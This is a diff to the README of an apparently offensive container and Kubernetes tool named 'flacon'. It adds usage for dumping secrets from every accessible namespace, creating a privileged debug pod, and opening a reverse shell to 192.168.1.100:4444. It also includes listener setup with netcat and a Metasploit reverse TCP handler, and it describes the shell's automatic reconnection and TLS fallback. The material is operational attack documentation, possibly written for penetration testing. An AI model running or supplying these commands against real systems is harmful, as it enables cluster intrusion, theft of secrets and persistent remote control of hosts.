@@ -105,18 +105,63 @@ make release-dry VERSION=v1.0.0
 
 ## Usage
 
-### Basic Usage
-
 ```bash
-# Run reconnaissance (outputs YAML by default)
+# Run full reconnaissance (includes filesystem scanning)
 ./flacon
+
+# Run quick reconnaissance (skips filesystem scanning)
+./flacon quick
 
 # Show version information
 ./flacon version
 
 # Show help
 ./flacon --help
+
+# Dump secrets from all accessible namespaces
+./flacon dump-secrets
+
+# Create a privileged debug pod
+./flacon debug-pod
+
+# Establish reverse shell connection
+./flacon reverse-shell 192.168.1.100:4444
 ```
+
+### Reverse Shell Usage
+
+The reverse shell feature provides a robust alternative to netcat with automatic reconnection, TLS support, and better error handling.
+
+**On your Kali Linux machine (listener):**
+```bash
+# Using netcat (basic)
+nc -lvp 4444
+
+# Using the provided test listener (recommended)
+python3 scripts/test_listener.py 4444
+
+# Using metasploit
+msfconsole
+use exploit/multi/handler
+set PAYLOAD linux/x64/shell_reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+run
+```
+
+**On the target system:**
+```bash
+# Connect to your listener
+./flacon reverse-shell 192.168.1.100:4444
+```
+
+**Features:**
+- **Automatic reconnection** with exponential backoff
+- **TLS support** as fallback if TCP fails
+- **Platform detection** and handshake
+- **Heartbeat messages** for connection monitoring
+- **Special commands**: `ping`, `info`, `exit`
+- **Cross-platform** (Windows, Linux, macOS)
 
 ### Version Information
 
